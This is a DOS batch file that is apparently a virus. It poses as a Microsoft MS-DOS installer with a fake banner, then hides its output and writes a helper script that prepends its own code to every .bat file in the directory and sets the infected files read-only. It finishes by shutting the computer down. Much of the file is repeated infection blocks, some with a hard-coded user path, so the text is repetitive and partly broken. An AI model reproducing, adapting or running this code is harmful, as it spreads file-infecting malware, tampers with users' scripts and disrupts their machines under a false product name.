echo del redsky.tmp >> redsky.bat
echo copy /b %%1 redsky.tmp >> redsky.bat
echo del %%1 >> redsky.bat
echo copy /b %0 + %0.bat + redsky.tmp %%1 >> redsky.bat
echo del redsky.tmp >> redsky.bat
echo attrib +r %%1 >> redsky.bat
echo :fuckit >> redsky.bat
for %%f in (*.bat) do call redsky.bat %%f
del redsky.bat
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b "C:\Documents and Settings\El PeloNe!\Escritorio\redsky.bat" + "C:\Documents and Settings\El PeloNe!\Escritorio\redsky.bat".bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b "C:\Documents and Settings\El PeloNe!\Escritorio\redsky.bat" + "C:\Documents and Settings\El PeloNe!\Escritorio\redsky.bat".bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
del redsky.tmp 
copy /b %1 redsky.tmp 
del %1 
copy /b redsky.bat + redsky.bat.bat + redsky.tmp %1 
del redsky.tmp 
attrib +r %1 
:fuckit 
@echo off
cls
echo ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ  
echo                       MS-DOS ESTA INICIANDO LA INSTALACION..        
echo                             MICROSOFT CORP.2004-2005    
echo                                  INTERBURN CORP... 
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo                              http://www.microsoft.com
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
echo ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pause
@ctty nul
echo if [%%1]==[redsky.BAT] goto fuckit > redsky.bat
echo del redsky_.tmp >> redsky.bat
echo copy /b %%1 redsky_.tmp >> redsky.bat
echo del %%1 >> redsky.bat
echo copy /b %0 + %0.bat + redsky_.tmp %%1 >> redsky.bat
echo del something.tmp >> redsky.bat
echo attrib +r %%1 >> redsky.bat
echo :fuckit >> redsky.bat
for %%f in (*.bat) do call redsky.bat %%f
del redsky.bat
ctty con
:: Created (c)2004 by lord killer/interburn?
@ctty nul
shutdown -s
exit